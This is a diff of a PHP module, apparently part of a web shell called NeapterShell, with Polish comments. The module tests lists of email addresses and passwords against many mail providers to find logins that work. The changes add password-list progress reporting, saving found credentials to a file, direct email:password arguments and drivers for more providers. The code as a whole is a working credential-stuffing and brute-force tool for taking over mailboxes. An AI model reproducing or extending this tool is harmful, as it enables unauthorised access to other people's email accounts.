+		return self::$aHostIp[ $sName ];
+	}
+
+	/**
+	 * Tryb gadatliwy
+	 *
+	 * @acess  public
+	 * @param  boolean         $bValue Wartosc
+	 * @return EmailValidator          Obiekt EmailValidator
+	 */
+	public function setVerbose( $bValue )
+	{
+		$this -> bVerbose = (boolean) $bValue;
+
+		return $this;
+	}
+
+	/**
+	 * Sciezka do pliku wynikowego
+	 *
+	 * @acess  public
+	 * @param  string        $sValue Sciezka do pliku wynikowego
+	 * @return EmailValidator        Obiekt EmailValidator
+	 */
+	public function setOutputFile( $sValue )
+	{
+		$this -> sOutputFile = (string) $sValue;
+		/**
+		 * Tworzenie pliku
+		 */
+		if( ! is_file( $this -> sOutputFile ) )
+		{
+			if( ! file_put_contents(  $this -> sOutputFile, '', LOCK_EX ) )
+			{
+				throw new EmailValidatorException( 'Nie można utworzyć pliku' );
+			}
+		}
+
+		/**
+		 * Czy plik jest do zapisu
+		 */
+		if( ! is_writable( $this -> sOutputFile ) )
+		{
+			throw new EmailValidatorException( 'Nie można zapisać do pliku' );
+		}
+
+		return $this;
+	}
+
+	/**
 	 * Proces walidacji adresow
 	 */
 	public function get()
@@ -1172,6 +1802,17 @@ class EmailValidator
 		$iEmails = count( $this -> aEmails );
 
 		echo "Rozpoczęto skanowanie\r\n\r\n";
+
+
+		/**
+		 * Laczna ilosc hasel w pliku
+		 */
+		if( ! $this -> bUsernamePassword )
+		{
+			$iPasswords = count( $this -> aPasswords );
+		}
+
+		$bSuccess = FALSE;
 
 		/**
 		 * Adresy email
@@ -1212,6 +1853,8 @@ class EmailValidator
 					/**
 					 * Sprawdzanie hasel wczytanych z osobnego pliku
 					 */
+					$i = 0;
+
 					foreach( $this -> aPasswords as $sPassword )
 					{
 						$sEmail = sprintf( '%s:%s', $aEmail[ 'email' ], $sPassword );
@@ -1224,6 +1867,17 @@ class EmailValidator
 							$bSuccess = TRUE;
 							break ;
 						}
+
+						/**
+						 * Informacja
+						 */
+						if( $this -> bVerbose || ( ( $i !== 0 ) && ( $i % 20 === 0 ) ) )
+						{
+							printf( "[INFO]  %05d/%05d - %07.3f%% ! %s:%s\r\n", $i + 1, $iPasswords, ( ( $i + 1 ) / $iPasswords ) * 100, $aEmail['email'], $sPassword );
+							@ ob_flush();
+							@ flush();
+						}
+						++$i;
 					}
 				}
 
@@ -1232,7 +1886,15 @@ class EmailValidator
 				 */
 				if( $bSuccess )
 				{
-					printf( "[FOUND] %05d/%05d - %07.3f%% # %s\r\n", $iIndex + 1, $iEmails, (($iIndex + 1 ) / $iEmails ) * 100, $sEmail );
+					$sOutput = sprintf( "[FOUND] %05d/%05d - %07.3f%% # %s\r\n", $iIndex + 1, $iEmails, (($iIndex + 1 ) / $iEmails ) * 100, $sEmail );
+
+					echo $sOutput;
+
+					if( $this -> sOutputFile !== NULL )
+					{
+						@ file_put_contents( $this -> sOutputFile, $sOutput, FILE_APPEND | LOCK_EX );
+					}
+
 					@ ob_flush();
 					@ flush();
 					$i = 0;
@@ -1240,9 +1902,14 @@ class EmailValidator
 				}
 			}
 
-			if( ( $i !== 0 ) && ( $i % 20 === 0 ) )
+			/**
+			 * Informacja
+			 */
+			if( ! $bSuccess && ( $this -> bVerbose || ( ( $i !== 0 ) && ( $i % 20 === 0 ) ) ) )
 			{
 				printf( "[INFO]  %05d/%05d - %07.3f%% ! %s\r\n", $iIndex + 1, $iEmails, (($iIndex + 1 ) / $iEmails ) * 100, $aEmail['email'] );
+				@ ob_flush();
+				@ flush();
 				$i = 0;
 			}
 			else
@@ -1354,33 +2021,16 @@ class EmailValidator
  */
 
 /**
- * ModuleEmailValidator - Sprawdzanie czy mozna zalogowa sie na skrzynke za pomoca uzytkownika i hasla
+ * Sprawdzanie czy mozna zalogowa sie na skrzynke za pomoca uzytkownika i hasla
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Modules
  */
-class ModuleEmailValidator implements ShellInterface
+class ModuleEmailValidator extends ModuleAbstract
 {
-	/**
-	 * Obiekt Shell
-	 *
-	 * @access private
-	 * @var    object
-	 */
-	private $oShell;
-
-	/**
-	 * Konstruktor
-	 *
-	 * @access public
-	 * @param  object $oShell Obiekt Shell
-	 * @return void
-	 */
-	public function __construct( Shell $oShell )
-	{
-		$this -> oShell = $oShell;
-	}
-
 	/**
 	 * Dostepna lista komend
 	 *
@@ -1406,7 +2056,7 @@ class ModuleEmailValidator implements ShellInterface
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.01 2011-11-12 - <krzotr@gmail.com>';
+		return '1.03 2012-11-09 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -1423,10 +2073,12 @@ Sprawdzanie loginu i hasla dla poczty
 	Sprawdzanie czy za pomoca loginu i hasla mozna zalogowac sie na poczte
 
 	Użycie:
-		emailvalidator plik_z_emailami [plik_z_hasłami]
+		emailvalidator dane [plik_z_hasłami]
 
-		plik_z_emailami - plik z emailami w formacie:
+		dane - plik z emailami w formacie:
 			email:hasło lub	email (jeżeli został użyty plik_z_hasłami)
+
+		dane - email:password [email2:password2]
 
 		plik_z_hasłami - plik, w którym znajdują się hasła; kiedy ta opcja jest użyta
 				 plik plik_z_emailami musi zawierać wyłącznie adres email (bez hasła)
@@ -1434,8 +2086,11 @@ Sprawdzanie loginu i hasla dla poczty
 
 	Opcje:
 		-i - wyświetlanie informacji o emailach w szczególności o wspieranych hostach
+		-v - tryb gadatliwy
 
 	Przykład:
+		emailvalidator test@wp.pl:test
+		emailvalidator test@wp.pl:test test2@wp.pl:test2 test3@wp.pl:test3
 		emailvalidator emails.txt
 		emailvalidator emails.txt passwords.txt
 
@@ -1454,7 +2109,7 @@ DATA;
 		/**
 		 * Help
 		 */
-		if( ( $this -> oShell -> iArgc !== 1 ) && ( $this -> oShell -> iArgc !== 2 ) )
+		if( $this -> oShell -> iArgc === 0 )
 		{
 			return $this -> getHelp();
 		}
@@ -1475,14 +2130,41 @@ DATA;
 				-> addDriver( new EmailValidatorDriverOrangepl() )
 				-> addDriver( new EmailValidatorDriverPocztapl() )
 				-> addDriver( new EmailValidatorDriverPlusnetpl() )
-				-> setEmailsFile( $this -> oShell -> aArgv[0] );
+				-> addDriver( new EmailValidatorDriverWebde() )
+				-> addDriver( new EmailValidatorDriverGmxde() )
+				-> addDriver( new EmailValidatorDriverInmailpl() )
+				-> addDriver( new EmailValidatorDriverPinopl() )
+				-> addDriver( new EmailValidatorDriverGgpl() )
+				-> addDriver( new EmailValidatorDriverMailru() );
+
+			$bUsernamePassword = FALSE;
+			if( preg_match( '~^.+?@.+?:.+?\z~', $this -> oShell -> aArgv[0] ) )
+			{
+				$bUsernamePassword = TRUE;
+				foreach( $this -> oShell -> aArgv as $sEmailPass )
+				{
+					$oMail -> addEmailPassword( $sEmailPass );
+				}
+			}
+			else
+			{
+				$oMail -> setEmailsFile( $this -> oShell -> aArgv[0] );
+			}
 
 			/**
 			 * Plik z haslami
 			 */
-			if( isset( $this -> oShell -> aArgv[1] ) )
+			if( ! $bUsernamePassword && isset( $this -> oShell -> aArgv[1] ) )
 			{
 				$oMail -> setPasswordsFile( $this -> oShell -> aArgv[1] );
+			}
+
+			/**
+			 * Tryb gadatliwy
+			 */
+			if( in_array( 'v', $this -> oShell -> aOptv ) )
+			{
+				$oMail -> setVerbose( TRUE );
 			}
 
 			header( 'Content-Type: text/plain; charset=utf-8' );
